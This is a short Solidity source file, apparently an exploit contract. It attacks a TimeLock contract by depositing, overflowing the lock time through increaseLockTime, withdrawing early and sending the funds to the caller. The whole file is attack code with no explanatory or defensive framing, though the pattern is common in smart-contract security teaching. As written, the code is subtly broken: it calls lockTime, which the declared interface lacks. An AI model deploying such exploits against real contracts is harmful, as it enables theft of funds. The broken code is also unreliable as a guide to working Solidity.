interface ITimeLock {
    function deposit() external payable;
    function increaseLockTime(uint _secondsToIncrease) external;
    function withdraw() external;
}

contract ExploitTimeLock {
    ITimeLock public timeLock;

    constructor(address _timeLockAddress) {
        timeLock = ITimeLock(_timeLockAddress);
    }

    function exploit() external payable {
        timeLock.deposit{value: msg.value}();
        timeLock.increaseLockTime(type(uint).max - timeLock.lockTime(address(this)) + 1);
        timeLock.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}